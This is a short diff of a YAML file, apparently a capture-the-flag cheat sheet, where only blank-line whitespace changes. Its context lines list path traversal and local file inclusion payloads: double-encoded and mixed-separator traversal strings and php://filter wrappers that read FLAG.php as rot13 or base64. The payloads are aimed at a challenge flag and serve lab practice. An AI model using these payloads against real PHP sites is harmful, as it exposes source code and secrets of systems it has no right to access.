@@ -31,10 +31,10 @@ tricks:
     payload: |
       # Double encoding
       ?id=....%2F....%2F....%2F....%2FFLAG.php
-      
+
       # Mixed separators
       ?id=....\/..\/....\/FLAG.php
-      
+
       # With php://filter wrapper
       ?id=php://filter/read=string.rot13/resource=....\/....\/....\/....\/FLAG.php
 
@@ -45,4 +45,3 @@ tricks:
       # Read source code
       ?id=php://filter/convert.base64-encode/resource=....\/....\/....\/....\/FLAG.php
       # Decode base64 to get PHP source with flag
-
